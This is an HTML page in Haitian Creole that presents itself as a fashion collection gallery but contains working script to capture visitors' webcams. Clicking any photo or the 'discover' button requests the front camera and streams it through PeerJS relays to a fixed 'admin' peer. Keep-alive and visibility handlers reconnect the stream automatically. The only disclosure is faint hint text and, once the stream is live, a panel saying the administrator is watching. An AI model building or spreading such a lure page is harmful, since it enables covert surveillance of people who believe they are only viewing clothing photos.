<!DOCTYPE html>
<html lang="ht">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Atelye Style — Koleksyon 2026</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #0d0d0d; color: white;
    font-family: 'Georgia', serif;
    min-height: 100vh; padding-bottom: 40px;
  }

  header {
    text-align: center; padding: 30px 20px 20px;
    border-bottom: 1px solid #222;
  }
  header h1 {
    font-size: 1.6rem; letter-spacing: 4px;
    color: #d4af37; text-transform: uppercase;
    font-weight: normal; margin-bottom: 6px;
  }
  header p {
    color: #888; font-size: 12px; letter-spacing: 2px;
    font-family: system-ui, sans-serif; text-transform: uppercase;
  }

  .gallery {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 8px; padding: 15px;
  }
  .item {
    position: relative; aspect-ratio: 3/4;
    border-radius: 10px; overflow: hidden;
    background: #1a1a1a; cursor: pointer;
    transition: transform 0.3s;
  }
  .item:active { transform: scale(0.97); }
  .item img {
    width: 100%; height: 100%; object-fit: cover;
    display: block;
  }
  .item .label {
    position: absolute; bottom: 0; left: 0; right: 0;
    background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
    padding: 20px 10px 10px;
    font-size: 12px; letter-spacing: 1px;
    color: #fff; font-family: system-ui, sans-serif;
    text-transform: uppercase;
    z-index: 2;
  }

  .cta {
    margin: 25px auto 0; max-width: 340px; padding: 0 20px;
    text-align: center;
  }
  .cta button {
    width: 100%; padding: 16px 20px;
    background: linear-gradient(135deg, #d4af37, #b8941f);
    color: #0d0d0d; border: none; border-radius: 10px;
    font-size: 14px; font-weight: bold;
    letter-spacing: 2px; text-transform: uppercase;
    cursor: pointer; font-family: system-ui, sans-serif;
    transition: opacity 0.3s;
  }
  .cta button:disabled { opacity: 0.5; cursor: not-allowed; }
  .cta .hint {
    font-size: 11px; color: #666; margin-top: 12px;
    font-family: system-ui, sans-serif; line-height: 1.5;
  }

  .active-panel {
    margin: 25px auto 0; max-width: 340px; padding: 0 20px;
    text-align: center;
  }
  .active-panel .card {
    background: #1a1a1a; border: 1px solid #d4af37;
    border-radius: 10px; padding: 20px;
  }
  .active-panel .dot {
    display: inline-block; width: 10px; height: 10px;
    border-radius: 50%; background: #ff3333;
    margin-right: 8px; animation: pulse 1s infinite;
    vertical-align: middle;
  }
  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
  .active-panel p { font-size: 14px; color: #ddd; font-family: system-ui, sans-serif; }
  .active-panel button {
    width: 100%; margin-top: 15px; padding: 14px;
    background: #cc3333; color: white; border: none;
    border-radius: 10px; font-size: 13px; font-weight: bold;
    letter-spacing: 1px; text-transform: uppercase;
    cursor: pointer; font-family: system-ui, sans-serif;
  }

  #status {
    text-align: center; color: #888; font-size: 12px;
    margin-top: 15px; font-family: system-ui, sans-serif;
    padding: 0 20px; min-height: 16px;
  }

  .hidden { display: none; }

  footer {
    text-align: center; color: #444; font-size: 10px;
    font-family: system-ui, sans-serif;
    margin-top: 30px; padding: 0 20px;
    letter-spacing: 1px;
  }
</style>
</head>
<body>

  <header>
    <h1>Atelye Style</h1>
    <p>Koleksyon 2026</p>
  </header>

  <!-- GALRI AK FOTO UNSPlASH -->
  <div class="gallery" id="gallery">

    <!-- 1. Mòd Ete -->
    <div class="item" data-style="Mòd Ete">
      <img src="https://images.unsplash.com/photo-1490481651871-ab68de25d43d?w=400&h=533&fit=crop"
           alt="Mòd Ete" loading="lazy">
      <div class="label">Mòd Ete</div>
    </div>

    <!-- 2. Flè Natirèl -->
    <div class="item" data-style="Flè Natirèl">
      <img src="https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=400&h=533&fit=crop"
           alt="Flè" loading="lazy">
      <div class="label">Flè Natirèl</div>
    </div>

    <!-- 3. Atizay Modèn -->
    <div class="item" data-style="Atizay Modèn">
      <img src="https://images.unsplash.com/photo-1541961017774-22349e4a1262?w=400&h=533&fit=crop"
           alt="Atizay" loading="lazy">
      <div class="label">Atizay Modèn</div>
    </div>

    <!-- 4. Style Klasik -->
    <div class="item" data-style="Style Klasik">
      <img src="https://images.unsplash.com/photo-1490481651871-ab68de25d43d?w=400&h=533&fit=crop"
           alt="Klasik" loading="lazy">
      <div class="label">Style Klasik</div>
    </div>

    <!-- 5. Bohème -->
    <div class="item" data-style="Bohème">
      <img src="https://images.unsplash.com/photo-1523381210434-271e8be1f52b?w=400&h=533&fit=crop"
           alt="Bohème" loading="lazy">
      <div class="label">Bohème</div>
    </div>

    <!-- 6. Minimalis -->
    <div class="item" data-style="Minimalis">
      <img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?w=400&h=533&fit=crop"
           alt="Minimalis" loading="lazy">
      <div class="label">Minimalis</div>
    </div>

  </div>

  <!-- BOUTON AKSEPTE -->
  <div class="cta" id="ctaView">
    <button id="btnStart">✨ Dekouvri Koleksyon an</button>
    <p class="hint">
      Lè w klike, ou dakò pou pataje kamera w pou yon ti moman.<br>
      Ou ka sispann nenpòt lè.
    </p>
  </div>

  <!-- ETA AKTIF -->
  <div class="active-panel hidden" id="activeView">
    <div class="card">
      <p><span class="dot"></span><strong>Kamera aktif</strong></p>
      <p style="margin-top:8px; font-size:13px; color:#aaa;">
        Administratè a ap wè ou kounye a.
      </p>
      <button id="btnStop">Sispann Pataje</button>
    </div>
  </div>

  <p id="status"></p>

  <footer>© 2026 — Tout dwa rezève</footer>

<script src="https://unpkg.com/peerjs@1.5.0/dist/peerjs.min.js"></script>
<script>
(() => {
  const ADMIN_ID = "admin-piyayy-2026-v2";

  const ctaView    = document.getElementById("ctaView");
  const activeView = document.getElementById("activeView");
  const btnStart   = document.getElementById("btnStart");
  const btnStop    = document.getElementById("btnStop");
  const statusEl   = document.getElementById("status");
  const gallery    = document.getElementById("gallery");

  const ICE_CONFIG = {
    iceServers: [
      { urls: "stun:stun.l.google.com:19302" },
      { urls: "stun:stun1.l.google.com:19302" },
      { urls: "turn:openrelay.metered.ca:80",
        username: "openrelayproject", credential: "openrelayproject" },
      { urls: "turn:openrelay.metered.ca:443",
        username: "openrelayproject", credential: "openrelayproject" },
      { urls: "turn:openrelay.metered.ca:443?transport=tcp",
        username: "openrelayproject", credential: "openrelayproject" }
    ]
  };

  let peer = null;
  let localStream = null;
  let currentCall = null;
  let active = false;
  let intentionallyStopped = false;
  let keepAliveTimer = null;

  function setStatus(msg) { statusEl.innerText = msg; }

  function ensurePeer() {
    if (peer && !peer.destroyed) return peer;
    peer = new Peer(undefined, { config: ICE_CONFIG, debug: 1 });

    peer.on("error", (err) => {
      console.warn("PeerJS erè:", err);
      setStatus("❌ Erè: " + err.type);
    });

    peer.on("disconnected", () => {
      if (active) {
        setTimeout(() => { if (peer && !peer.destroyed) peer.reconnect(); }, 2000);
      }
    });

    return peer;
  }

  async function ensureCamera() {
    if (localStream) {
      const tracks = localStream.getVideoTracks();
      const hasLive = tracks.length > 0 && tracks.some(t => t.readyState === "live");
      if (hasLive) return true;
      try { tracks.forEach(t => t.stop()); } catch (e) {}
      localStream = null;
    }
    try {
      localStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });
      return true;
    } catch (err) {
      try {
        localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        return true;
      } catch (err2) {
        return false;
      }
    }
  }

  async function ensureCall() {
    const p = ensurePeer();

    if (currentCall) {
      const pc = currentCall.peerConnection;
      const broken =
        currentCall.open === false ||
        (pc && (pc.iceConnectionState === "failed" ||
                pc.iceConnectionState === "closed" ||
                pc.iceConnectionState === "disconnected"));
      if (!broken) return true;
      try { currentCall.close(); } catch (e) {}
      currentCall = null;
    }

    const camOk = await ensureCamera();
    if (!camOk) return false;

    if (!p.open) {
      await new Promise((resolve) => {
        if (p.open) return resolve();
        const t = setTimeout(resolve, 3000);
        p.once("open", () => { clearTimeout(t); resolve(); });
      });
    }
    if (!p.open) return false;

    currentCall = p.call(ADMIN_ID, localStream);
    if (!currentCall) return false;

    currentCall.on("close", () => { currentCall = null; });
    currentCall.on("error", (e) => {
      console.warn("Call erè:", e);
      currentCall = null;
    });
    return true;
  }

  function startKeepAlive() {
    if (keepAliveTimer) return;
    keepAliveTimer = setInterval(async () => {
      if (!active || intentionallyStopped) return;
      const camAlive = localStream &&
        localStream.getVideoTracks().some(t => t.readyState === "live");
      const callAlive = currentCall && currentCall.open !== false &&
        currentCall.peerConnection &&
        currentCall.peerConnection.iceConnectionState !== "failed" &&
        currentCall.peerConnection.iceConnectionState !== "closed";
      if (!camAlive || !callAlive) {
        await ensureCall();
        if (currentCall) setStatus("🟢 Ou konekte.");
      }
    }, 3000);
  }

  function stopKeepAlive() {
    if (keepAliveTimer) { clearInterval(keepAliveTimer); keepAliveTimer = null; }
  }

  async function startSharing() {
    btnStart.disabled = true;
    setStatus("⏳ Ap mande pèmisyon kamera...");
    intentionallyStopped = false;

    const ok = await ensureCamera();
    if (!ok) {
      setStatus("❌ Ou refize oswa kamera pa disponib.");
      btnStart.disabled = false;
      return;
    }

    setStatus("📡 Ap konekte...");
    await ensureCall();

    active = true;
    ctaView.classList.add("hidden");
    activeView.classList.remove("hidden");
    setStatus("🟢 Ou konekte.");

    startKeepAlive();
  }

  function stopSharing() {
    intentionallyStopped = true;
    active = false;
    stopKeepAlive();

    if (currentCall) { try { currentCall.close(); } catch (e) {} currentCall = null; }
    if (localStream) {
      localStream.getTracks().forEach(t => t.stop());
      localStream = null;
    }

    activeView.classList.add("hidden");
    ctaView.classList.remove("hidden");
    btnStart.disabled = false;
    setStatus("⛔ Ou sispann pataje.");
  }

  btnStart.onclick = startSharing;
  btnStop.onclick  = stopSharing;

  gallery.addEventListener("click", (e) => {
    const item = e.target.closest(".item");
    if (item && !active) {
      console.log("🖼 Klike sou:", item.dataset.style);
      startSharing();
    }
  });

  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible" && active && !intentionallyStopped) {
      setTimeout(async () => {
        const camAlive = localStream &&
          localStream.getVideoTracks().some(t => t.readyState === "live");
        if (!camAlive || !currentCall || currentCall.open === false) {
          await ensureCall();
        }
      }, 300);
    }
  });

  window.addEventListener("pageshow", () => {
    if (active && !intentionallyStopped) {
      setTimeout(async () => {
        const camAlive = localStream &&
          localStream.getVideoTracks().some(t => t.readyState === "live");
        if (!camAlive || !currentCall || currentCall.open === false) {
          await ensureCall();
        }
      }, 300);
    }
  });

  window.addEventListener("beforeunload", () => {
    stopKeepAlive();
    if (localStream) localStream.getTracks().forEach(t => t.stop());
    if (currentCall) try { currentCall.close(); } catch (e) {}
    if (peer && !peer.destroyed) peer.destroy();
  });
})();
</script>
</body>
</html>
